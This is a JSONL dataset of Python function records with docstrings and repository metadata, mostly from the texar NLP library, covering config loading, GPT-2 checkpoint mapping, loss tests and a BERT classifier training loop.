{"docstring": "\"\"\"Remove all boxes with any side smaller than min_size.\"\"\"\n", "func_signal": "def _filter_irregular_boxes(boxes, min_ratio = 0.2, max_ratio = 5):\n", "code": "ws = boxes[:, 2] - boxes[:, 0] + 1\nhs = boxes[:, 3] - boxes[:, 1] + 1\nrs = ws / hs\nkeep = np.where((rs <= max_ratio) & (rs >= min_ratio))[0]\nreturn keep", "path": "chinese_ocr/ctpn/lib/rpn_msr/proposal_layer_tf.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"Evaluates the model. See :tf_main:`tf.estimator.Estimator.evaluate\n<estimator/Estimator#evaluate>` for more details.\n\nArgs:\n    steps (int, optional): Number of steps for which to evaluate\n        model. If `None`, evaluates until the eval data raises an\n        OutOfRange exception.\n    checkpoint_path (str, optional): Path of a specific checkpoint to\n        evaluate. If `None`, the the latest checkpoint in\n        :attr:`config.model_dir` is used. If there are no checkpoints\n        in :attr:`model_dir`, evaluation is run with newly initialized\n        variables instead of restored from checkpoint.\n\"\"\"\n", "func_signal": "def evaluate(self, steps=None, checkpoint_path=None):\n", "code": "eval_spec = self._get_eval_spec(steps=steps)\nself._estimator.evaluate(\n    input_fn=eval_spec.input_fn,\n    steps=eval_spec.steps,\n    hooks=eval_spec.hooks,\n    checkpoint_path=checkpoint_path)", "path": "texar/texar/tf/run/executor.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"Tests `sequence_softmax_cross_entropy`\n\"\"\"\n", "func_signal": "def test_sequence_softmax_cross_entropy(self):\n", "code": "self._test_sequence_loss(\n    tx.losses.sequence_softmax_cross_entropy,\n    self._one_hot_labels, self._logits, self._sequence_length)", "path": "texar/tests/losses/mle_losses_test.py", "commit_date": "2020-02-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"Tests `sequence_sparse_softmax_cross_entropy`\n\"\"\"\n", "func_signal": "def test_sequence_sparse_softmax_cross_entropy(self):\n", "code": "self._test_sequence_loss(\n    tx.losses.sequence_sparse_softmax_cross_entropy,\n    self._labels, self._logits, self._sequence_length)", "path": "texar/tests/losses/mle_losses_test.py", "commit_date": "2020-02-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"Trains the model. See :tf_main:`tf.estimator.Estimator.train\n<estimator/Estimator#train>` for more details.\n\nArgs:\n    max_steps (int, optional): Total number of steps for which\n        to train model. If `None`, train forever or until the train\n        data generates the OutOfRange exception. If OutOfRange occurs\n        in the middle, training stops before :attr:`max_steps` steps.\n\"\"\"\n", "func_signal": "def train(self, max_steps=None):\n", "code": "train_spec = self._get_train_spec(max_steps=max_steps)\nself._estimator.train(\n    input_fn=train_spec.input_fn,\n    hooks=train_spec.hooks,\n    max_steps=train_spec.max_steps)", "path": "texar/texar/tf/run/executor.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"Loads configs from (possibly multiple) file(s).\n\nA config file can be either a Python file (with suffix '.py')\nor a YAML file. If the filename is not suffixed with '.py', the file is\nparsed as YAML.\n\nArgs:\n    config_path: Paths to configuration files. This can be a `list` of\n        config file names, or a path to a directory in which all files\n        are loaded, or a string of multiple file names separated by commas.\n    config (dict, optional): A config dict to which new configurations are\n        added. If `None`, a new config dict is created.\n\nReturns:\n    A `dict` of configurations.\n\"\"\"\n", "func_signal": "def load_config(config_path, config=None):\n", "code": "fnames = []\nif isinstance(config_path, (list, tuple)):\n    fnames = list(config_path)\nelif tf.gfile.IsDirectory(config_path):\n    for fname in tf.gfile.ListDirectory(config_path):\n        fname = os.path.join(config_path, fname)\n        if not tf.gfile.IsDirectory(fname):\n            fnames.append(fname)\nelse:\n    for fname in config_path.split(\",\"):\n        fname = fname.strip()\n        if not fname:\n            continue\n        fnames.append(fname)\n\nif config is None:\n    config = {}\n\nfor fname in fnames:\n    config = load_config_single(fname, config)\n\nreturn config", "path": "texar/texar/tf/utils/utils_io.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"\nTensor name mapping\n\"\"\"\n", "func_signal": "def _map_tensor_names(original_tensor_name):\n", "code": "global_tensor_map = {\n    \"model/wte\": \"word_embedder/w\",\n    \"model/wpe\": \"position_embedder/w\",\n    \"model/ln_f/b\": \"transformer_decoder/beta\",\n    \"model/ln_f/g\": \"transformer_decoder/gamma\",\n}\nif original_tensor_name in global_tensor_map:\n    return global_tensor_map[original_tensor_name]\noriginal_tensor_name_split = original_tensor_name.split(\"/\")\nlayer_tensor_map = {\n    \"ln_1/b\": \"beta\",\n    \"ln_1/g\": \"gamma\",\n    \"ln_2/b\": \"past_poswise_ln/beta\",\n    \"ln_2/g\": \"past_poswise_ln/gamma\",\n    \"mlp/c_fc/b\": \"ffn/conv1/bias\",\n    \"mlp/c_fc/w\": \"ffn/conv1/kernel\",\n    \"mlp/c_proj/b\": \"ffn/conv2/bias\",\n    \"mlp/c_proj/w\": \"ffn/conv2/kernel\",\n    \"attn/c_proj/b\": \"self_attention/multihead_attention/output/bias\",\n    \"attn/c_proj/w\": \"self_attention/multihead_attention/output/kernel\",\n}\nlayer_num = int(original_tensor_name_split[1][1:])\nlayer_feature = \"/\".join(original_tensor_name.split(\"/\")[2:])\n# pylint: disable=no-else-return\nif layer_feature in layer_tensor_map:\n    layer_feature_ = layer_tensor_map[layer_feature]\n    tensor_name_ = \"/\".join(\n        [\n            \"transformer_decoder\",\n            \"layer_{}\".format(layer_num),\n            layer_feature_\n        ])\n    return tensor_name_\nelse:\n    return original_tensor_name", "path": "texar/examples/gpt-2/utils/model_utils.py", "commit_date": "2019-10-22 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"Loads config from a single file.\n\nThe config file can be either a Python file (with suffix '.py')\nor a YAML file. If the filename is not suffixed with '.py', the file is\nparsed as YAML.\n\nArgs:\n    fname (str): The config file name.\n    config (dict, optional): A config dict to which new configurations are\n        added. If `None`, a new config dict is created.\n\nReturns:\n    A `dict` of configurations.\n\"\"\"\n", "func_signal": "def load_config_single(fname, config=None):\n", "code": "if fname.endswith('.py'):\n    new_config = _load_config_python(fname)\nelse:\n    new_config = _load_config_yaml(fname)\n\nif config is None:\n    config = new_config\nelse:\n    for key, value in new_config.items():\n        if key in config:\n            if isinstance(config[key], dict):\n                config[key].update(value)\n            else:\n                config[key] = value\n        else:\n            config[key] = value\n\nreturn config", "path": "texar/texar/tf/utils/utils_io.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"Tests `sequence_sigmoid_cross_entropy`.\n\"\"\"\n", "func_signal": "def test_sequence_sigmoid_cross_entropy(self):\n", "code": "self._test_sequence_loss(\n    tx.losses.sequence_sigmoid_cross_entropy,\n    self._one_hot_labels, self._logits, self._sequence_length)\n\nself._test_sequence_loss(\n    tx.losses.sequence_sigmoid_cross_entropy,\n    self._one_hot_labels[:, :, 0],\n    self._logits[:, :, 0],\n    self._sequence_length)\n\nlabels = tf.placeholder(dtype=tf.int32, shape=None)\nloss = tx.losses.sequence_sigmoid_cross_entropy(\n    logits=self._logits[:, :, 0],\n    labels=tf.cast(labels, tf.float32),\n    sequence_length=self._sequence_length)\nwith self.test_session() as sess:\n    rank = sess.run(\n        tf.rank(loss),\n        feed_dict={labels: np.ones([self._batch_size, self._max_time])})\n    self.assertEqual(rank, 0)", "path": "texar/tests/losses/mle_losses_test.py", "commit_date": "2020-02-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"Tests :class:`~texar.tf.utils.AverageRecorder`\n\"\"\"\n", "func_signal": "def test_average_recorder(self):\n", "code": "recorder = AverageRecorder(5)\nfor i in range(100):\n    self.assertEqual(recorder.add([1., 2.]), [1., 2.])\n    self.assertEqual(recorder.add([1.]), [1., 2.])\n    self.assertEqual(recorder.avg(), [1., 2.])\n    self.assertEqual(recorder.avg(0), 1.)\n    self.assertEqual(recorder.avg(1), 2.)\n    self.assertEqual(recorder.avg([0, 1]), [1., 2.])\n\nrecorder = AverageRecorder()\nfor i in range(100):\n    self.assertEqual(recorder.add({'1': 1, '2': 2}), {'1': 1., '2': 2.})\n    self.assertEqual(recorder.add({'1': 1}), {'1': 1., '2': 2.})\n    self.assertEqual(recorder.avg(), {'1': 1., '2': 2.})\n    self.assertEqual(recorder.avg('1'), 1.)\n    self.assertEqual(recorder.avg('2'), 2.)\n    self.assertEqual(recorder.avg(['1', '2']), {'1': 1., '2': 2.})", "path": "texar/tests/utils/average_recorder_test.py", "commit_date": "2020-02-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"\nInitializes GPT-2 model parameters from a checkpoint\n\nArgs:\n    init_checkpoint (str): Path to the checkpoint.\n\"\"\"\n", "func_signal": "def init_gpt2_checkpoint(sess, init_checkpoint):\n", "code": "tvars = tf.trainable_variables()\nif init_checkpoint:\n    assignment_map = _get_assignment_map_from_checkpoint(\n        sess,\n        tvars,\n        init_checkpoint)\n    init_fn = tf.contrib.framework.assign_from_checkpoint_fn(\n        init_checkpoint, assignment_map, reshape_variables=True)\n    init_fn(sess)", "path": "texar/examples/gpt-2/utils/model_utils.py", "commit_date": "2019-10-22 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"Makes vocab.\n\"\"\"\n", "func_signal": "def main(_):\n", "code": "filenames = tx.utils.get_files(FLAGS.files)\n\nif FLAGS.count:\n    vocab, count = tx.data.make_vocab(\n        filenames,\n        max_vocab_size=FLAGS.max_vocab_size,\n        newline_token=FLAGS.newline_token,\n        return_count=True)\n\n    with open(FLAGS.output_path, \"w\", encoding=\"utf-8\") as fout:\n        for v, c in zip(vocab, count):\n            fout.write('{}\\t{}\\n'.format(v, c))\nelse:\n    vocab = tx.data.make_vocab(\n        filenames,\n        max_vocab_size=FLAGS.max_vocab_size,\n        newline_token=FLAGS.newline_token)\n\n    with open(FLAGS.output_path, \"w\", encoding=\"utf-8\") as fout:\n        fout.write('\\n'.join(vocab))", "path": "texar/bin/utils/make_vocab.py", "commit_date": "2018-10-11 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"Creates directory if doesn't exist\n\"\"\"\n", "func_signal": "def maybe_create_dir(dirname):\n", "code": "if not tf.gfile.IsDirectory(dirname):\n    tf.gfile.MakeDirs(dirname)\n    return True\nreturn False", "path": "texar/texar/tf/utils/utils_io.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"\nLoad pretrained parameters to texar model\n\"\"\"\n\n", "func_signal": "def _get_assignment_map_from_checkpoint(sess, all_variables, init_checkpoint):\n", "code": "assignment_map = {}\n\nreader = tf.train.NewCheckpointReader(init_checkpoint)\nvar_names_list = reader.get_variable_to_shape_map().keys()\nckpt_names_vs_vals = {}\nfor var_name in var_names_list:\n    ckpt_names_vs_vals[var_name] = reader.get_tensor(var_name)\n\ndef _assign_by_name(sess, tensor_name, data):\n    local_tensor = [var for var in all_variables\n                    if tensor_name in var.name][0]\n    sess.run(tf.assign(local_tensor, data))\n\ndef _get_tensor_by_name(tensor_name):\n    local_tensor = [var for var in all_variables\n                    if tensor_name in var.name][0]\n    return local_tensor\n\nfor idx, ckpt_tensor_name in enumerate(ckpt_names_vs_vals):\n    processing = (idx + 1.0) / len(ckpt_names_vs_vals.keys())\n    sys.stdout.write(\"\\rLoading checkpoint: {:.1%}\".format(processing))\n    sys.stdout.flush()\n\n    ckpt_tensor_name_feature = \"\"\n    if len(ckpt_tensor_name.split(\"/\")) > 2:\n        ckpt_tensor_name_feature = \"/\".join(\n            ckpt_tensor_name.split(\"/\")[2:])\n    if ckpt_tensor_name_feature == \"attn/c_attn/w\":\n        layer_num = int(ckpt_tensor_name.split(\"/\")[1][1:])\n        template = (\"transformer_decoder/layer_{}/self_attention/\"\n                    \"multihead_attention/{}/kernel\")\n        local_tensor_name_q_w = template.format(layer_num, \"query\")\n        local_tensor_name_k_w = template.format(layer_num, \"key\")\n        local_tensor_name_v_w = template.format(layer_num, \"value\")\n\n        data = ckpt_names_vs_vals[ckpt_tensor_name]\n        assert data.shape[2] % 3 == 0, (\"tensor 'attn/c_attn/w' \"\n                                        \"shape is not dividable\")\n        index_w = data.shape[2] // 3\n        q_w = data[:, :, :index_w]\n        k_w = data[:, :, index_w: 2 * index_w]\n        v_w = data[:, :, 2 * index_w:]\n        _assign_by_name(sess, local_tensor_name_q_w, np.squeeze(q_w))\n        _assign_by_name(sess, local_tensor_name_k_w, np.squeeze(k_w))\n        _assign_by_name(sess, local_tensor_name_v_w, np.squeeze(v_w))\n\n    elif ckpt_tensor_name_feature == \"attn/c_attn/b\":\n        layer_num = int(ckpt_tensor_name.split(\"/\")[1][1:])\n        template = (\"transformer_decoder/layer_{}/self_attention/\"\n                    \"multihead_attention/{}/bias\")\n        local_tensor_name_q_b = template.format(layer_num, \"query\")\n        local_tensor_name_k_b = template.format(layer_num, \"key\")\n        local_tensor_name_v_b = template.format(layer_num, \"value\")\n\n        data = ckpt_names_vs_vals[ckpt_tensor_name]\n        assert data.shape[0] % 3 == 0, (\"tensor 'attn/c_attn/b'\"\n                                        \" shape is not dividable\")\n        index_b = data.shape[0] // 3\n        q_b = data[:index_b]\n        k_b = data[index_b: 2 * index_b]\n        v_b = data[2 * index_b:]\n        _assign_by_name(sess, local_tensor_name_q_b, q_b)\n        _assign_by_name(sess, local_tensor_name_k_b, k_b)\n        _assign_by_name(sess, local_tensor_name_v_b, v_b)\n\n    else:\n        local_tensor_name = _map_tensor_names(ckpt_tensor_name)\n        local_tensor = _get_tensor_by_name(local_tensor_name)\n        assignment_map[ckpt_tensor_name] = local_tensor\n\nreturn assignment_map", "path": "texar/examples/gpt-2/utils/model_utils.py", "commit_date": "2019-10-22 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"Returns a dictionary of hyperparameters with default values.\n\n.. code-block:: python\n\n    {\n        # (1) Conv layers\n        \"num_conv_layers\": 1,\n        \"filters\": 128,\n        \"kernel_size\": [3, 4, 5],\n        \"conv_activation\": \"relu\",\n        \"conv_activation_kwargs\": None,\n        \"other_conv_kwargs\": None,\n        # (2) Pooling layers\n        \"pooling\": \"MaxPooling1D\",\n        \"pool_size\": None,\n        \"pool_strides\": 1,\n        \"other_pool_kwargs\": None,\n        # (3) Dense layers\n        \"num_dense_layers\": 1,\n        \"dense_size\": 128,\n        \"dense_activation\": \"identity\",\n        \"dense_activation_kwargs\": None,\n        \"final_dense_activation\": None,\n        \"final_dense_activation_kwargs\": None,\n        \"other_dense_kwargs\": None,\n        # (4) Dropout\n        \"dropout_conv\": [1],\n        \"dropout_dense\": [],\n        \"dropout_rate\": 0.75,\n        # (5) Others\n        \"name\": \"conv1d_network\",\n    }\n\nHere:\n\n1. For **convolutional** layers:\n\n    \"num_conv_layers\": int\n        Number of convolutional layers.\n\n    \"filters\": int or list\n        The number of filters in the convolution, i.e., the\n        dimensionality\n        of the output space. If \"num_conv_layers\" > 1, \"filters\" must be\n        a list of \"num_conv_layers\" integers.\n\n    \"kernel_size\": int or list\n        Lengths of 1D convolution windows.\n\n        - If \"num_conv_layers\" == 1, this can be a list of arbitrary \\\n        number\\\n        of `int` denoting different sized conv windows. The number of \\\n        filters of each size is specified by \"filters\". For example,\\\n        the default values will create 3 sets of filters, each of which\\\n        has kernel size of 3, 4, and 5, respectively, and has filter\\\n        number 128.\n        - If \"num_conv_layers\" > 1, this must be a list of length \\\n        \"num_conv_layers\". Each element can be an `int` or a list \\\n        of arbitrary number of `int` denoting the kernel size of \\\n        respective layer.\n\n    \"conv_activation\": str or callable\n        Activation function applied to the output of the convolutional\n        layers. Set to \"indentity\" to maintain a linear activation.\n        See :func:`~texar.tf.core.get_activation_fn` for more details.\n\n    \"conv_activation_kwargs\": dict, optional\n        Keyword arguments for conv layer activation functions.\n        See :func:`~texar.tf.core.get_activation_fn` for more details.\n\n    \"other_conv_kwargs\": dict, optional\n        Other keyword arguments for\n        :tf_main:`tf.layers.Conv1D <layers/Conv1d>` constructor, e.g.,\n        \"data_format\", \"padding\", etc.\n\n2. For **pooling** layers:\n\n    \"pooling\": str or class or instance\n        Pooling layer after each of the convolutional layer(s). Can\n        a pooling layer class, its name or module path, or a class\n        instance.\n\n    \"pool_size\": int or list, optional\n        Size of the pooling window. If an `int`, all pooling layer\n        will have the same pool size. If a list, the list length must\n        equal \"num_conv_layers\". If `None` and the pooling type\n        is either\n        :tf_main:`MaxPooling <layers/MaxPooling1D>` or\n        :tf_main:`AveragePooling <layers/AveragePooling1D>`, the\n        pool size will be set to input size. That is, the output of\n        the pooling layer is a single unit.\n\n    \"pool_strides\": int or list, optional\n        Strides of the pooling operation. If an `int`, all pooling layer\n        will have the same stride. If a list, the list length must\n        equal \"num_conv_layers\".\n\n    \"other_pool_kwargs\": dict, optional\n        Other keyword arguments for pooling layer class constructor.\n\n3. For **dense** layers (note that here dense layers always follow conv\n   and pooling layers):\n\n    \"num_dense_layers\": int\n        Number of dense layers.\n\n    \"dense_size\": int or list\n        Number of units of each dense layers. If an `int`, all dense\n        layers will have the same size. If a list of `int`, the list\n        length must equal \"num_dense_layers\".\n\n    \"dense_activation\": str or callable\n        Activation function applied to the output of the dense\n        layers **except** the last dense layer output . Set to\n        \"indentity\" to maintain a linear activation.\n        See :func:`~texar.tf.core.get_activation_fn` for more details.\n\n    \"dense_activation_kwargs\": dict, optional\n        Keyword arguments for dense layer activation functions before\n        the last dense layer.\n        See :func:`~texar.tf.core.get_activation_fn` for more details.\n\n    \"final_dense_activation\": str or callable\n        Activation function applied to the output of the **last** dense\n        layer. Set to `None` or\n        \"indentity\" to maintain a linear activation.\n        See :func:`~texar.tf.core.get_activation_fn` for more details.\n\n    \"final_dense_activation_kwargs\": dict, optional\n        Keyword arguments for the activation function of last\n        dense layer.\n        See :func:`~texar.tf.core.get_activation_fn` for more details.\n\n    \"other_dense_kwargs\": dict, optional\n        Other keyword arguments for\n        :tf_main:`Dense <layers/Dense>`\n        layer class constructor.\n\n4. For **dropouts**:\n\n    \"dropout_conv\": int or list\n        The indexes of conv layers (starting from `0`) whose **inputs**\n        are applied with dropout. The index = :attr:`num_conv_layers`\n        means dropout applies to the final conv layer output. E.g.,\n\n        .. code-block:: python\n\n            {\n                \"num_conv_layers\": 2,\n                \"dropout_conv\": [0, 2]\n            }\n\n        will leads to a series of layers as\n        `-dropout-conv0-conv1-dropout-`.\n\n        The dropout mode (training or not) is controlled\n        by the :attr:`mode` argument of :meth:`_build`.\n\n    \"dropout_dense\": int or list\n        Same as \"dropout_conv\" but applied to dense layers (index\n        starting from `0`).\n\n    \"dropout_rate\": float\n        The dropout rate, between 0 and 1. E.g.,\n        `\"dropout_rate\": 0.1` would drop out 10% of elements.\n\n5. Others:\n\n    \"name\": str\n        Name of the network.\n\"\"\"\n", "func_signal": "def default_hparams():\n", "code": "return {\n    # Conv layers\n    \"num_conv_layers\": 1,\n    \"filters\": 128,\n    \"kernel_size\": [3, 4, 5],\n    \"conv_activation\": \"relu\",\n    \"conv_activation_kwargs\": None,\n    \"other_conv_kwargs\": None,\n    # Pooling layers\n    \"pooling\": \"MaxPooling1D\",\n    \"pool_size\": None,\n    \"pool_strides\": 1,\n    \"other_pool_kwargs\": None,\n    # Dense layers\n    \"num_dense_layers\": 1,\n    \"dense_size\": 128,\n    \"dense_activation\": \"identity\",\n    \"dense_activation_kwargs\": None,\n    \"final_dense_activation\": None,\n    \"final_dense_activation_kwargs\": None,\n    \"other_dense_kwargs\": None,\n    # Dropout\n    \"dropout_conv\": [1],\n    \"dropout_dense\": [],\n    \"dropout_rate\": 0.75,\n    # Others\n    \"name\": \"conv1d_network\",\n    \"@no_typecheck\": [\"filters\", \"kernel_size\", \"conv_activation\",\n                      \"pool_size\", \"pool_strides\",\n                      \"dense_size\", \"dense_activation\",\n                      \"dropout_conv\", \"dropout_dense\"]\n}", "path": "texar/texar/tf/modules/networks/conv_networks.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"Gets a list of file paths given possibly a pattern :attr:`file_paths`.\n\nAdapted from `tf.contrib.slim.data.parallel_reader.get_data_files`.\n\nArgs:\n    file_paths: A (list of) path to the files. The path can be a pattern,\n        e.g., /path/to/train*, /path/to/train[12]\n\nReturns:\n    A list of file paths.\n\nRaises:\n    ValueError: If no files are not found\n\"\"\"\n", "func_signal": "def get_files(file_paths):\n", "code": "if isinstance(file_paths, (list, tuple)):\n    files = []\n    for f in file_paths:\n        files += get_files(f)\nelse:\n    if '*' in file_paths or '?' in file_paths or '[' in file_paths:\n        files = tf.gfile.Glob(file_paths)\n    else:\n        files = [file_paths]\nif not files:\n    raise ValueError('No data files found in %s' % (file_paths,))\nreturn files", "path": "texar/texar/tf/utils/utils_io.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"\nBuilds the model and runs.\n\"\"\"\n", "func_signal": "def main(_):\n", "code": "if FLAGS.distributed:\n    import horovod.tensorflow as hvd\n    hvd.init()\n\ntf.logging.set_verbosity(tf.logging.INFO)\n\ntx.utils.maybe_create_dir(FLAGS.output_dir)\n\n# Loads data\nnum_train_data = config_data.num_train_data\n\n# Configures distribued mode\nif FLAGS.distributed:\n    config_data.train_hparam[\"dataset\"][\"num_shards\"] = hvd.size()\n    config_data.train_hparam[\"dataset\"][\"shard_id\"] = hvd.rank()\n    config_data.train_hparam[\"batch_size\"] //= hvd.size()\n\ntrain_dataset = tx.data.TFRecordData(hparams=config_data.train_hparam)\neval_dataset = tx.data.TFRecordData(hparams=config_data.eval_hparam)\ntest_dataset = tx.data.TFRecordData(hparams=config_data.test_hparam)\n\niterator = tx.data.FeedableDataIterator({\n    'train': train_dataset, 'eval': eval_dataset, 'test': test_dataset})\nbatch = iterator.get_next()\ninput_ids = batch[\"input_ids\"]\nsegment_ids = batch[\"segment_ids\"]\nbatch_size = tf.shape(input_ids)[0]\ninput_length = tf.reduce_sum(1 - tf.cast(tf.equal(input_ids, 0), tf.int32),\n                             axis=1)\n# Builds BERT\nhparams = {\n    'clas_strategy': 'cls_time'\n}\nmodel = tx.modules.BERTClassifier(\n    pretrained_model_name=FLAGS.pretrained_model_name,\n    hparams=hparams)\nlogits, preds = model(input_ids, input_length, segment_ids)\n\naccu = tx.evals.accuracy(batch['label_ids'], preds)\n\n# Optimization\nloss = tf.losses.sparse_softmax_cross_entropy(\n    labels=batch[\"label_ids\"], logits=logits)\nglobal_step = tf.Variable(0, trainable=False)\n\n# Builds learning rate decay scheduler\nstatic_lr = config_downstream.lr['static_lr']\nnum_train_steps = int(num_train_data / config_data.train_batch_size\n                      * config_data.max_train_epoch)\nnum_warmup_steps = int(num_train_steps * config_data.warmup_proportion)\nlr = model_utils.get_lr(global_step, num_train_steps,  # lr is a Tensor\n                        num_warmup_steps, static_lr)\n\nopt = tx.core.get_optimizer(\n    global_step=global_step,\n    learning_rate=lr,\n    hparams=config_downstream.opt\n)\n\nif FLAGS.distributed:\n    opt = hvd.DistributedOptimizer(opt)\n\ntrain_op = tf.contrib.layers.optimize_loss(\n    loss=loss,\n    global_step=global_step,\n    learning_rate=None,\n    optimizer=opt)\n\n# Train/eval/test routine\n\ndef _is_head():\n    if not FLAGS.distributed:\n        return True\n    return hvd.rank() == 0\n\ndef _train_epoch(sess):\n    \"\"\"Trains on the training set, and evaluates on the dev set\n    periodically.\n    \"\"\"\n    iterator.restart_dataset(sess, 'train')\n\n    fetches = {\n        'train_op': train_op,\n        'loss': loss,\n        'batch_size': batch_size,\n        'step': global_step\n    }\n\n    while True:\n        try:\n            feed_dict = {\n                iterator.handle: iterator.get_handle(sess, 'train'),\n                tx.global_mode(): tf.estimator.ModeKeys.TRAIN,\n            }\n            rets = sess.run(fetches, feed_dict)\n            step = rets['step']\n\n            dis_steps = config_data.display_steps\n            if _is_head() and dis_steps > 0 and step % dis_steps == 0:\n                tf.logging.info('step:%d; loss:%f;' % (step, rets['loss']))\n\n            eval_steps = config_data.eval_steps\n            if _is_head() and eval_steps > 0 and step % eval_steps == 0:\n                _eval_epoch(sess)\n\n        except tf.errors.OutOfRangeError:\n            break\n\ndef _eval_epoch(sess):\n    \"\"\"Evaluates on the dev set.\n    \"\"\"\n    iterator.restart_dataset(sess, 'eval')\n\n    cum_acc = 0.0\n    cum_loss = 0.0\n    nsamples = 0\n    fetches = {\n        'accu': accu,\n        'loss': loss,\n        'batch_size': batch_size,\n    }\n    while True:\n        try:\n            feed_dict = {\n                iterator.handle: iterator.get_handle(sess, 'eval'),\n                tx.context.global_mode(): tf.estimator.ModeKeys.EVAL,\n            }\n            rets = sess.run(fetches, feed_dict)\n\n            cum_acc += rets['accu'] * rets['batch_size']\n            cum_loss += rets['loss'] * rets['batch_size']\n            nsamples += rets['batch_size']\n        except tf.errors.OutOfRangeError:\n            break\n\n    tf.logging.info('eval accu: {}; loss: {}; nsamples: {}'.format(\n        cum_acc / nsamples, cum_loss / nsamples, nsamples))\n\ndef _test_epoch(sess):\n    \"\"\"Does predictions on the test set.\n    \"\"\"\n    iterator.restart_dataset(sess, 'test')\n\n    _all_preds = []\n    while True:\n        try:\n            feed_dict = {\n                iterator.handle: iterator.get_handle(sess, 'test'),\n                tx.context.global_mode(): tf.estimator.ModeKeys.PREDICT,\n            }\n            _preds = sess.run(preds, feed_dict=feed_dict)\n            _all_preds.extend(_preds.tolist())\n        except tf.errors.OutOfRangeError:\n            break\n\n    output_file = os.path.join(FLAGS.output_dir, \"test_results.tsv\")\n    with tf.gfile.GFile(output_file, \"w\") as writer:\n        writer.write('\\n'.join(str(p) for p in _all_preds))\n\n# Broadcasts global variables from rank-0 process\nif FLAGS.distributed:\n    bcast = hvd.broadcast_global_variables(0)\n\nsession_config = tf.ConfigProto()\nif FLAGS.distributed:\n    session_config.gpu_options.visible_device_list = str(hvd.local_rank())\n\nwith tf.Session(config=session_config) as sess:\n    sess.run(tf.global_variables_initializer())\n    sess.run(tf.local_variables_initializer())\n    sess.run(tf.tables_initializer())\n\n    if FLAGS.distributed:\n        bcast.run()\n\n    # Restores trained model if specified\n    saver = tf.train.Saver()\n    if FLAGS.checkpoint:\n        saver.restore(sess, FLAGS.checkpoint)\n\n    iterator.initialize_dataset(sess)\n\n    if FLAGS.do_train:\n        for i in range(config_data.max_train_epoch):\n            _train_epoch(sess)\n        saver.save(sess, FLAGS.output_dir + '/model.ckpt')\n\n    if FLAGS.do_eval:\n        _eval_epoch(sess)\n\n    if FLAGS.do_test:\n        _test_epoch(sess)", "path": "texar/examples/bert/bert_classifier_main.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
{"docstring": "\"\"\"\nRemap the config file\n\"\"\"\n", "func_signal": "def transform_gpt2_to_texar_config(input_json_path):\n", "code": "config_gpt = json.loads(open(input_json_path).read())\nconfigs = dict()\nconfigs[\"vocab_size\"] = config_gpt[\"n_vocab\"]\nconfigs[\"context_size\"] = config_gpt[\"n_ctx\"]\nconfigs[\"embedding_size\"] = config_gpt[\"n_embd\"]\nhidden_dim = config_gpt[\"n_embd\"]\nconfigs[\"embed\"] = {\n    \"dim\": hidden_dim,\n}\nconfigs[\"position_size\"] = config_gpt[\"n_ctx\"]\nconfigs[\"pos_embed\"] = {\n    \"dim\": hidden_dim\n}\nconfigs[\"decoder\"] = {\n    \"dim\": hidden_dim,\n    \"num_blocks\": config_gpt[\"n_layer\"],\n    \"multihead_attention\": {\n        \"use_bias\": True,\n        \"num_units\": hidden_dim,\n        \"num_heads\": config_gpt[\"n_head\"],\n        \"output_dim\": hidden_dim,\n    },\n    \"initializer\": {\n        \"type\": \"variance_scaling_initializer\",\n        \"kwargs\": {\n            \"scale\": 1.0,\n            \"mode\": \"fan_avg\",\n            \"distribution\": \"uniform\",\n        },\n    },\n    \"poswise_feedforward\": {\n        \"layers\": [\n            {\n                \"type\": \"Dense\",\n                \"kwargs\": {\n                    \"name\": \"conv1\",\n                    \"units\": hidden_dim * 4,\n                    \"activation\": \"gelu\",\n                    \"use_bias\": True,\n                }\n            },\n            {\n                \"type\": \"Dense\",\n                \"kwargs\": {\n                    \"name\": \"conv2\",\n                    \"units\": hidden_dim,\n                    \"use_bias\": True,\n                }\n            }\n        ],\n        \"name\": \"ffn\",\n    },\n}\nreturn HParams(configs, default_hparams=None)", "path": "texar/examples/gpt-2/utils/model_utils.py", "commit_date": "2019-10-22 00:00:00", "repo_name": "asyml/texar", "stars": 2379, "license": "apache-2.0", "language": "python", "size": 14241}
